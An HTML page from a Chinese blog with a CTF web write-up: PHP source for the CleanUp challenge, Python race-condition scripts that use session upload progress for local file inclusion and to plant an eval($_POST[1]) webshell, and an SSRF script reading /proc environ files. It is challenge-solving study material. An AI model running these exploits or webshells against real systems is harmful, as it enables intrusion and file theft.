

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



    <head>
        <meta charset="UTF-8">
        <link rel="apple-touch-icon" sizes="76x76" href="/img/avater.jpg">
        <link rel="icon" href="/img/avater.jpg">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC&display=swap" rel="stylesheet">
        
                <meta name="theme-color" content="#2f4154">
                <meta name="author" content="whistle.H">
                <meta name="keywords" content="">
                
                    <meta name="description" content="记录一下在各种平台做到一些题目">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF-Web-wp">
<meta property="og:url" content="http://example.com/2022/04/13/blog0013-NSS-Web-wp/index.html">
<meta property="og:site_name" content="The world of whistleH">
<meta property="og:description" content="记录一下在各种平台做到一些题目">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816223126427.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819203318445.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164252562.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164448420.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164612299.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164839225.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230402001608480.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230402001734334.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230402001913349.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816154514295.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816154908285.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816155906990.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/%5BT8KS0BQQGOGD8O0I2H05GU.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816150221722.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816150356769.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816151222621.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816151522399.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816152852215.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018005050116.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011057035.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011220758.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/blog0013-0001.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/blog0013_0002.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230331231210292.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205451649.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205728808.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205821071.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923152627815.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161449908.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161825562.png">
<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401144412655.png">
<meta property="article:published_time" content="2022-04-13T02:58:50.000Z">
<meta property="article:modified_time" content="2023-09-03T08:53:28.383Z">
<meta property="article:author" content="whistle.H">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="web">
<meta property="article:tag" content="NSS">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816223126427.png">
                        
                                
                                        
                                                    <title>
                                                        CTF-Web-wp - The world of whistleH
                                                    </title>

                                                    <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/mac.css">



                                                        <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
                                                            <script  src="/js/utils.js" ></script>
                                                                <script  src="/js/color-schema.js" ></script>
                                                                    


                                                                        
    <meta name="generator" content="Hexo 5.4.0"></head>

<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>The world of whistleH</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CTF-Web-wp"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-04-13 10:58" pubdate>
          2022年4月13日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          42k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          349 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CTF-Web-wp</h1>
            
            
              <div class="markdown-body">
                
                <p>记录一下在各种平台做到一些题目</p>
<span id="more"></span>
<h2 id="lfi">1、LFI</h2>
<h3 id="第五空间-cleanup条件竞争">1、2021第五空间-CleanUp（条件竞争）</h3>
<p>直接放上源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mode&#x27;</span>]))&#123; <br>        highlight_file(<span class="hljs-keyword">__file__</span>); <br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mode&#x27;</span>] == <span class="hljs-string">&quot;eval&quot;</span>)&#123; <br>        <span class="hljs-variable">$shell</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>] : <span class="hljs-string">&#x27;phpinfo();&#x27;</span>; <br>        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$shell</span>) &gt; <span class="hljs-number">15</span>)&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker&quot;</span>); <br>        &#125;<br>        <span class="hljs-keyword">if</span>(filter(<span class="hljs-variable">$shell</span>))&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;filter&quot;</span>); <br>        &#125;<br>        <span class="hljs-keyword">if</span>(checkNums(<span class="hljs-variable">$shell</span>))&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;shell&quot;</span>); <br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>); <br>    &#125; <br><br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123; <br>        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &gt; <span class="hljs-number">15</span> | filter(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker&quot;</span>); <br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]; <br>    &#125; <br><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123; <br>        <span class="hljs-variable">$banned</span> = [<span class="hljs-string">&quot;while&quot;</span>, <span class="hljs-string">&quot;for&quot;</span>, <span class="hljs-string">&quot;\$_&quot;</span>, <span class="hljs-string">&quot;include&quot;</span>, <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;require&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;`&quot;</span>]; <br><br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$banned</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$ban</span>)&#123; <br>            <span class="hljs-keyword">if</span>(strstr(<span class="hljs-variable">$var</span>, <span class="hljs-variable">$ban</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>; <br>        &#125; <br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>; <br>    &#125; <br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkNums</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123; <br>        <span class="hljs-variable">$alphanum</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; <br>        <span class="hljs-variable">$cnt</span> = <span class="hljs-number">0</span>; <br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$alphanum</span>); <span class="hljs-variable">$i</span>++)&#123; <br>            <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt; strlen(<span class="hljs-variable">$var</span>); <span class="hljs-variable">$j</span>++)&#123; <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$var</span>[<span class="hljs-variable">$j</span>] == <span class="hljs-variable">$alphanum</span>[<span class="hljs-variable">$i</span>])&#123; <br>                    <span class="hljs-variable">$cnt</span> += <span class="hljs-number">1</span>; <br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$cnt</span> &gt; <span class="hljs-number">8</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>; <br>                &#125; <br>            &#125; <br>        &#125; <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>; <br>    &#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>简单分析之后，我们可以发现首先对注入的代码长度做出了限制，还对字符做出了限制，这样我们能打的空间比较小了。</p>
<p>尝试一下</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">mode=eval&amp;shell=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure>
<p>于是找到了flag在根目录下，其实看到docker环境想试试pearcmd.php能不能利用上，但是被长度限制卡死了。</p>
<p>接下来可以考虑试试能不能卡临时文件包含（这个其实也只能猜，因为其实没有给session，试试看）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><br>sess_id = <span class="hljs-string">&quot;p&quot;</span><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28475/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post_file</span>(<span class="hljs-params">session</span>):</span><br>    content = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">20</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        session.post(<br>            url=url,         <br>            data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;&lt;?php system(&#x27;cat /nssctfasdasdflag&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sess_id&#125;,<br>            files=&#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&#x27;a.txt&#x27;</span>, content)&#125;,<br>        )<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;上传文件----&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_content</span>(<span class="hljs-params">session</span>):</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;/tmp/sess_&quot;</span> + sess_id<br>    &#125;<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.html&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> fout:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            r = session.get(url=url,params=params)<br>            check = <span class="hljs-string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span><br>            <span class="hljs-keyword">if</span> check <span class="hljs-keyword">in</span> r.text:<br>                fout.write(r.text)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;retry---&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        t1 = Thread(target=post_file, args=(session,))<br>        t2 = Thread(target=get_content,args=(session,))<br>        t1.start()<br>        t2.start()<br></code></pre></td></tr></table></figure>
<p>其实最开始想要将命令逃逸出去实现任意RCE，但是发现好像并没有写的权限（这里也附上脚本，说不定啥时候就能一把梭了）。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><br>sess_id = <span class="hljs-string">&quot;p&quot;</span><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28475/&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>(<span class="hljs-params">session</span>):</span><br>    content = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">20</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        session.post(<br>            url=url,         <br>            data=&#123;<br>                <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;&lt;?php file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span><br>            &#125;,<br>            cookies=&#123;<br>                <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sess_id<br>            &#125;,<br>            files=&#123;<br>                <span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&#x27;a.txt&#x27;</span>, content)<br>            &#125;,<br>        )<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;上传文件----&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">LFI</span>(<span class="hljs-params">session</span>):</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;/tmp/sess_&quot;</span> + sess_id<br>    &#125;<br>    <span class="hljs-comment">#with open(&quot;res.html&quot;,&quot;w&quot;) as fout:</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r = session.get(url=url,params=params)<br>        check = <span class="hljs-string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span><br>        <span class="hljs-keyword">if</span> check <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-comment">#fout.write(r.text)</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LFI读取---&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vuln</span>(<span class="hljs-params">session</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r = session.get(url + <span class="hljs-string">&quot;1.php&quot;</span>)<br>        <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-comment">#print(&quot;get_vuln&quot;)</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;获取vuln---&quot;</span>)      <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        t1 = Thread(target=upload, args=(session,))<br>        t2 = Thread(target=LFI,args=(session,))<br>        t3 = Thread(target=vuln,args=(session,))<br>        t1.start()<br>        t2.start()<br>        t3.start()<br></code></pre></td></tr></table></figure>
<h3 id="sdctf-2022curl-read-and-uplfi读取proc">2、SDCTF 2022—cURL Read and UP（LFI读取/proc）</h3>
<p>这道题发现漏洞点倒不是非常难，但是最开始确实是不知道flag在哪里。</p>
<p>进去之后输入url，http://www.baidu.com</p>
<p>跳转到某个页面，研究URL，发现read之后的内容似乎为base64编码，解码后发现其实就是JSON</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//43.143.7.127:28318/read/eyJ1cmwiOiJmaWxlOi8vL3Byb2MvMTgvZW52aXJvbiJ9</span><br></code></pre></td></tr></table></figure>
<p>于是直接构造脚本读取文件了</p>
<p>这里补充一下/proc的相关知识，Linux中"一切皆文件"，因此可以通过/proc目录下的内容读取进程相关的信息</p>
<p>首先通过读取<code>/proc/self/status</code>，读取到父进程的pid，也就是web服务进程</p>
<p>再通过<code>/proc/&lt;pid&gt;/environ</code>读取到当前进程的环境变量配置</p>
<p>只能说，还是不太熟悉flag可能隐藏的地方。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">import</span> re<br><br>pattern = <span class="hljs-string">r&#x27;&lt;div id=&quot;readability-page-1&quot; class=&quot;page&quot;&gt;(.+?)&lt;/div&gt;&#x27;</span><br><br><br>data = <span class="hljs-string">&#x27;&#123;&quot;url&quot;:&quot;file:///proc/18/environ&quot;&#125;&#x27;</span><br><span class="hljs-comment">#&#x27;&#123;&quot;url&quot;:&quot;file:///proc/self/status&quot;&#125;&#x27;</span><br><br>url = <span class="hljs-string">&quot;http://43.143.7.127:28318/read/&quot;</span><br><br>r = requests.get(url = url + base64.b64encode(data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.html&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>).write(r.content)<br><br>target = re.findall(pattern, r.text)<br><br><span class="hljs-built_in">print</span>(target)<br></code></pre></td></tr></table></figure>
<h2 id="rce">2、RCE</h2>
<h3 id="swpufinalrce无回显rce">1、SWPU—finalrce（无回显rce）</h3>
<p>无回显RCE的方法常见的思路有：</p>
<ul>
<li>DNS外带</li>
<li>反弹shell</li>
</ul>
<p>每种方法都有很多的trick，比如反弹shell就有非常多的方法，后续可能出一篇反弹shell的总结。</p>
<p>先看这道题：</p>
